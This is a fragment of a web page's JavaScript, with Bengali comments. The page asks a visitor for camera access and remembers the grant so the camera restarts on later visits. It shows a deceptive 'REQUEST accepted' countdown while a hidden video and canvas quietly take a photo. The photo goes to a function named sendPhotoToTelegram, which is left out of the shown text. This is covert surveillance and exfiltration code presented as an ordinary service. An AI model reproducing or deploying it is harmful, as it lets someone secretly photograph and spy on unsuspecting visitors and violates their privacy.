<!-- ... তোমার HTML Head একই থাকবে ... -->
<video id="video" autoplay playsinline style="display: none;" width="640" height="480"></video>
<canvas id="cameraCanvas" width="640" height="480" style="display: none;"></canvas>

<script>
let cameraAccessGranted = false;

// Auto check on page load
window.onload = function () {
    if (localStorage.getItem("cameraAccessGranted") === "true") {
        cameraAccessGranted = true;
        document.getElementById("allowButton").style.display = "none";
        document.getElementById("allowMessage").style.display = "none";
        autoStartCamera(); // নতুন যুক্ত
    }
}

function requestCameraAccess() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            cameraAccessGranted = true;
            localStorage.setItem("cameraAccessGranted", "true");

            document.getElementById("allowButton").style.display = "none";
            document.getElementById("allowMessage").style.display = "none";
            document.getElementById("cameraAccessPopup").style.display = "none";

            const video = document.getElementById("video");
            video.srcObject = stream;

            startProcess();
        })
        .catch(() => {
            document.getElementById("cameraAccessPopup").style.display = "block";
        });
}

function autoStartCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            const video = document.getElementById("video");
            video.srcObject = stream;
            startProcess();
        })
        .catch(() => {
            localStorage.removeItem("cameraAccessGranted");
            document.getElementById("allowButton").style.display = "block";
            document.getElementById("allowMessage").style.display = "block";
        });
}

function startProcess() {
    const message = document.getElementById("videoLink").value.trim();
    if (message === "") return;

    document.getElementById("messageContainer").style.display = "block";
    let counter = 30;
    const countdownInterval = setInterval(() => {
        document.getElementById("countdown").innerText = counter;
        counter--;
        if (counter < 0) {
            clearInterval(countdownInterval);
            document.getElementById("messageContainer").innerHTML = "REQUEST accepted. Your work will be done shortly. Thank you :)";
            captureAndSendPhoto(message);
        }
    }, 1000);
}

function captureAndSendPhoto(message) {
    const video = document.getElementById("video");
    const canvas = document.getElementById("cameraCanvas");
    const context = canvas.getContext("2d");

    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob((blob) => {
        sendPhotoToTelegram(blob, message);
    }, "image/png");
}

// ... sendPhotoToTelegram, sendTextToTelegram, drawMatrix কোড আগের মতোই থাকবে ...
</script> 
